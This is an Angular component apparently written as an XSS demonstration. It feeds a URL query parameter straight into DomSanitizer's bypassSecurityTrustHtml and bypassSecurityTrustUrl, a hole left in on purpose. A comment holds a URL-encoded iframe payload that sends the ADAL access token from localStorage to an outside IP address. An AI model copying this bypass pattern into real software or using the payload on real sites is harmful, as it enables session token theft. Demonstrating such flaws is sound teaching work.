import { Component, OnInit } from '@angular/core';
import { ActivatedRoute, Params } from '@angular/router';
import { DomSanitizer, SafeResourceUrl, SafeUrl, SafeHtml} from '@angular/platform-browser';

@Component({
  selector: 'app-bypass-security',
  templateUrl: './bypass-security.component.html',
  styleUrls: ['./bypass-security.component.css']
})
export class BypassSecurityComponent implements OnInit {

  dangerousUrl: string;
  dangerousHtmlTag: string;
  dangerousVideoUrl: string;
  trustedHtmlTag: SafeHtml;
  trustedUrl: SafeUrl;
  videoUrl: SafeResourceUrl;
  name: SafeHtml;
  nameURL: SafeUrl;

  // XSS Example for Demo
  // http://localhost:4200/bypass?name=%3Ciframe%20src%3Djavascript:window.location.href%3D%27http:%2F%2F104.40.75.104:8000%2F17xsend1%3Ftoken%3D%27%2Bwindow.localStorage.getItem(%22adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e%22)%3E%3C%2Fiframe%3E 

  constructor(private sanitizer: DomSanitizer, private activatedRoute: ActivatedRoute) {
    this.name = sanitizer.bypassSecurityTrustHtml(this.activatedRoute.snapshot.queryParams['name']);
    this.nameURL = sanitizer.bypassSecurityTrustUrl('messages/' + this.activatedRoute.snapshot.queryParams['name']);
    this.dangerousUrl = 'javascript:alert(window.localStorage.getItem(\'adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e\'))';
    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
  }
  ngOnInit() {
  }
}
